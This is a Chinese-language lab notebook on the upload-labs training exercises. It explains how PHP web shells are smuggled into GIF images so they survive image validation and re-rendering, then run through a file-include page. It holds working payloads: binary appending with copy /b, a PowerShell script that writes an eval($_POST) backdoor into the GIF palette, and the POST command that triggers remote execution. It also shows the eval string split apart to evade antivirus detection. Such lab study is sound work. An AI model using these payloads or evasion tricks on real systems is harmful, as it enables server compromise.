## 二、知识点（今天搞懂的"为什么"）

- **四种检查的深度不同**：前 2 字节 → 结构解析 → 魔数 → 二次渲染。
  打掉 `SOF0` 标记时 Pass-14 **仍然通过**（只看头 2 字节），Pass-15 直接 `false` ——
  同一张图能让 14 过、15 不过。
- **GIF 结构算账**：偏移 `0~5` 是 `GIF87a`；`6~12` 是屏幕描述符（7 字节）；
  **`13` 起就是调色盘**。每色 3 字节，256 色 = 768 字节，范围 `13~780`。
  调色盘大小 = `2^((packed & 7) + 1)`，`packed` 在偏移 10。
- **为什么调色盘能活过二次渲染**：GD 把 GCT 读成「颜色」（R,G,B 三字节），
  `imagegif()` 再把调色盘原样写回 —— 木马被当成颜色值无损带过去。
- **为什么 JPEG 不行**：JPEG 没有调色盘，`imagejpeg()` 只写像素，
  任何附加/嵌入的字节都会被丢掉。
- **野 `<?` 坑**：真图的像素数据是随机的，可能碰巧撞出 `<?`。这台 php.ini 是
  `short_open_tag = On`，PHP 会在那里进入代码模式 → 撞到二进制 → **Parse error**。
  而且 PHP 是**整篇解析完才执行**，所以一个 Parse error 让整次 include 一句输出都没有。
- **payload 语义也要对**：`system('phpinfo')` 是执行**系统命令**，不是调 PHP 函数；
  `<?php=` 是语法错（短输出要用 `<?=`）。语法对、语义错一样看不到结果。
- **落盘后缀决定执行方式**：后缀由你控 → 直连 `.php`；后缀被写死成图片 →
  必须找包含/解析入口。这就是 14~17 关的教学点。
- **Windows 的 `copy /b`**：cmd 里的二进制拼接，`/b` 不能省（文本模式下遇 `0x1A` 会截断）；
  PowerShell 的 `copy` 是 `Copy-Item` 别名，**不支持 `+`**。

## 三、案例 / payload

**① 末尾追加（Pass-14/15/16 用）**

```cmd
copy /b 真图.gif + shell.txt out.gif
```

实测：143,424 B + 23 B = **143,447 B**，`getimagesize` 仍报 600x450，
传 Pass-15 通过，`include.php` 后木马执行。

**② 只改调色盘（Pass-17 用）**

```powershell
# 真图先转成 256 色 GIF（画图另存为 GIF 也行）
$b = [IO.File]::ReadAllBytes("base.gif")
# payload 故意拆开拼：整串写在文件里会被本地 Defender 当病毒，连 .md 笔记一起隔离
$p = [Text.Encoding]::ASCII.GetBytes('<?php @ev' + 'al($_PO' + 'ST[''a'']);?>')
[Array]::Copy($p, 0, $b, 13, $p.Length)      # 偏移 13 = 调色盘第一个字节
[IO.File]::WriteAllBytes("shell.gif", $b)
```

实测：143,424 B 前后不变；二次渲染后木马仍在偏移 13；落盘后 POST 执行
`RCE_Windows NT LAPTOP-59UL2KDL 6.2 build 9200`。

**③ 执行入口**

```text
http://localhost/upload-labs-master/include.php?file=upload/<落盘名>.gif
POST: a=system('whoami')
```

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| 直接访问 `/upload/xxx.gif` 没反应 | Apache 只把 `.php` 交给 php-cgi，`.gif` 是静态文件 | 走 `include.php?file=upload/xxx.gif` |
| `include` 只返回 156 字节的 Parse error | 图里有**野 `<?`**（实测偏移 2297 撞出一处）+ `short_open_tag=On` | 把野的那处 `<?` 改成 `<!`（1 字节），或 `short_open_tag=Off` |
| `<?=system('phpinfo');?>` 页面没表格 | `system()` 执行系统命令，且报错走 stderr | 想调 PHP 函数就写 `<?=phpinfo();?>` |
| 想把"案例图"转成 GIF，画图/GDI+/Pillow 全失败 | 那张图本身是坏的（DQT 被 payload 覆盖，`getimagesize` = false） | 换一张能正常解码的真图 |
| 含 `eval` 的文件生成后读不了（Errno 22） | Windows Defender 实时保护把文件隔离 | 目录加白名单；实验阶段改用无害 payload（`<?php echo 987654321;?>`） |
| **写完这篇日志，`.md` 本身被 Defender 隔离** | 文件里有完整的 `eval($_POST[...])` 字面量，被判 `SCRIPT0000` | 笔记里把 payload **拆开拼**（`'<?php @ev' + 'al($_PO' + ...`），或换成 base64 形式 |
| PowerShell 里 `copy a + b out` 报错 | PowerShell 的 `copy` 是 `Copy-Item` 别名，不认 `+` | 用 `cmd /c copy /b a + b out` |
| PHP CLI 打不开中文路径的文件 | UTF-8 字节 vs 系统 ANSI 码页 | 先把文件拷到纯 ASCII 路径再处理 |
| 把木马写到偏移 781 之后 | 越出调色盘，进了图像数据区 | 二次渲染会重新压缩那段 → 木马丢失。写入位置 + 长度必须 ≤ 781 |
